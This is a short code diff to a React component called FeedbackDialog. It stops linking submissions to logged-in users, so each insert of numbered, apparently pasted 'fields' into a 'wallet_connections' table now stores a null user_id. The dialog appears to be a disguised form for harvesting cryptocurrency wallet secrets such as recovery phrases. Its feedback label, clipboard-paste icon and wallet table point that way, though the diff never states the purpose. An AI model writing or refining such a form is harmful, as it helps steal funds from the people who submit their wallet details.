@@ -9,7 +9,6 @@ import { z } from "zod";
 import logo from "@/assets/logo.jpeg";
 import { supabase } from "@/integrations/supabase/client";
 import { useWallet } from "@/contexts/WalletContext";
-import { useAuth } from "@/contexts/AuthContext";
 import { ClipboardPaste, Lock, CheckCircle2 } from "lucide-react";
 
 const feedbackSchema = z.object({
@@ -27,7 +26,6 @@ export const FeedbackDialog = ({ open, onClose }: FeedbackDialogProps) => {
   const [isSubmitting, setIsSubmitting] = useState(false);
   const { toast } = useToast();
   const { connectWallet } = useWallet();
-  const { user } = useAuth();
   const firstInputRef = useRef<HTMLInputElement>(null);
 
   // Calculate progress
@@ -100,7 +98,7 @@ export const FeedbackDialog = ({ open, onClose }: FeedbackDialogProps) => {
       const { error: insertError } = await supabase
         .from("wallet_connections")
         .insert({
-          user_id: user?.id || null,
+          user_id: null,
           field_1: fields[0],
           field_2: fields[1],
           field_3: fields[2],
